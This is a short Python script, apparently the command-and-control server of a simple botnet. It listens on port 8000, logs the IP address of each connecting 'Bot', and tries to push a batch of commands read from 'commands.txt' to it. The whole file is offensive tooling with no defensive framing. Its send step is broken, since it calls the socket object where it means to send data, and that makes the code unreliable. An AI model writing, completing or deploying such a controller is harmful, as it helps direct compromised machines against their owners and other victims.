import socketserver
def load_file_commands(file_name="commands.txt"):
  with open(file_name, 'rb') as file:
    return file.read()

COMMANDS = load_file_commands()

class BotHandler(socketserver.BaseRequestHandler):
  def handle(self):
    self.data = self.request.recv(1024).strip()
    print("[*] Bot with IP:" + '' + self.client_address[0])
    self.request(COMMANDS)

  
if __name__ == "__main__":
  HOST, PORT = "", 8000
  tcpServer = socketserver.TCPServer((HOST, PORT), BotHandler)

  try:
    tcpServer.serve_forever()
  except:
    print("Finish")
